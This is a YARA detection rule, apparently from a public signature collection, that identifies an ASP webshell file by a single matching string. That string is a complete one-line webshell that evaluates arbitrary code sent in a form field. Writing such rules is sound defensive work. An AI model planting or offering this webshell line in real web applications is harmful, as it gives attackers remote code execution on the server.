rule icyfox007v1_10_rar_Folder_asp {
	meta:
		description = "Webshells Auto-generated - file asp.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "2c412400b146b7b98d6e7755f7159bb9"
		id = "52150b6a-2f60-5e6b-86d1-61bc0aeb4fa8"
	strings:
		$s0 = "<SCRIPT RUNAT=SERVER LANGUAGE=JAVASCRIPT>eval(Request.form('#')+'')</SCRIPT>"
	condition:
		all of them
}